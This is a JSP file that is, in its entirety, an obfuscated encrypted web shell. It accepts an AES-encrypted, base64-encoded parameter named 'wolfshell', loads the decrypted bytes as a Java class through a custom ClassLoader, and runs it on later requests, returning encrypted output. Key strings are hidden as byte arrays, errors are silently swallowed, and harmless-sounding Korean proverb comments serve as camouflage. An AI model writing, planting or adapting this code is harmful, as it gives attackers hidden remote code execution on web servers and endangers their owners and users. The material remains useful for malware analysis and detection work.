<%!
// 배고파요, 치킨 먹고 싶다.
class C_0xf3a {
    private String k_val = "3c6e0b8a9c15224a";
    private String p_name = "wolfshell";

    // 인생은 아름다워
    class L_0x1c extends ClassLoader {
        public L_0x1c(ClassLoader p) { super(p); }
        public Class d(byte[] b) { return super.defineClass(b, 0, b.length); }
    }
    
    // 이 또한 지나가리라.
    private byte[] x(byte[] s, boolean m) throws Exception {
        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(new String(new byte[]{65, 69, 83}));
        c.init(m ? javax.crypto.Cipher.ENCRYPT_MODE : javax.crypto.Cipher.DECRYPT_MODE, new javax.crypto.spec.SecretKeySpec(k_val.getBytes(), new String(new byte[]{65, 69, 83})));
        return c.doFinal(s);
    }

    // 수고했어, 오늘도.
    private String h(String s) throws Exception {
        java.security.MessageDigest md = java.security.MessageDigest.getInstance(new String(new byte[]{77, 68, 53}));
        md.update(s.getBytes(), 0, s.length());
        return new java.math.BigInteger(1, md.digest()).toString(16).toUpperCase();
    }
    
    // 내일은 내일의 태양이 뜬다.
    private byte[] b64d(String str) throws Exception {
        try {
            Class<?> clz = this.getClass().getClassLoader().loadClass("java.util.Base64");
            Object d = clz.getMethod("getDecoder").invoke(null);
            return (byte[]) d.getClass().getMethod("decode", String.class).invoke(d, str);
        } catch (Exception e) {
            Class<?> clz = this.getClass().getClassLoader().loadClass("sun.misc.BASE64Decoder");
            Object d = clz.newInstance();
            return (byte[]) d.getClass().getMethod("decodeBuffer", String.class).invoke(d, str);
        }
    }
    
    // 하늘이 무너져도 솟아날 구멍은 있다.
    private String b64e(byte[] b) throws Exception {
        try {
            Class<?> clz = Class.forName("java.util.Base64");
            Object e = clz.getMethod("getEncoder").invoke(null);
            return (String) e.getClass().getMethod("encodeToString", byte[].class).invoke(e, new Object[]{b});
        } catch (Exception ex) {
            Class<?> clz = Class.forName("sun.misc.BASE64Encoder");
            Object e = clz.newInstance();
            return (String) e.getClass().getMethod("encode", byte[].class).invoke(e, new Object[]{b});
        }
    }

    // 시작이 반이다.
    public void run(javax.servlet.jsp.PageContext pageContext) {
        try {
            javax.servlet.http.HttpServletRequest req = (javax.servlet.http.HttpServletRequest) pageContext.getRequest();
            javax.servlet.http.HttpServletResponse res = (javax.servlet.http.HttpServletResponse) pageContext.getResponse();
            javax.servlet.http.HttpSession sess = pageContext.getSession();
            
            byte[] raw_data = b64d(req.getParameter(p_name));
            byte[] proc_data = x(raw_data, false);
            String p_key = new String(new byte[]{112, 97, 121, 108, 111, 97, 100});

            if (sess.getAttribute(p_key) == null) {
                sess.setAttribute(p_key, new L_0x1c(this.getClass().getClassLoader()).d(proc_data));
            } else {
                req.setAttribute("parameters", proc_data);
                java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
                Object inst = ((Class) sess.getAttribute(p_key)).newInstance();
                inst.equals(out);
                inst.equals(pageContext);
                
                String chk = h(p_name + k_val);
                res.getWriter().write(chk.substring(0, 16));
                inst.toString();
                res.getWriter().write(b64e(x(out.toByteArray(), true)));
                res.getWriter().write(chk.substring(16));
            }
        } catch (Exception e) {
            // 괜찮아, 다 잘 될 거야.
        }
    }
}
%><%
new C_0xf3a().run(pageContext);
%>